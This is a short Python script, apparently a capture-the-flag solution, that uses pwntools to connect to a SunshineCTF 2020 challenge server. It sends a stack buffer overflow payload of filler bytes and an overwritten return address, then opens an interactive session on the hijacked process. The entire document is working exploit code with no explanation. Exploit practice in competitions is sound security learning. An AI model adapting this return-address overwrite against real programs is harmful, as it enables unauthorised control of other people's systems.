from pwn import *
r = remote('chal.2020.sunshinectf.org', 30002)
r.recv(1024)
r.sendline(b'a')
r.sendline(b'a'*(0x3a+4)+b'\xd6\x84\x04\x08')
r.interactive()
r.close()
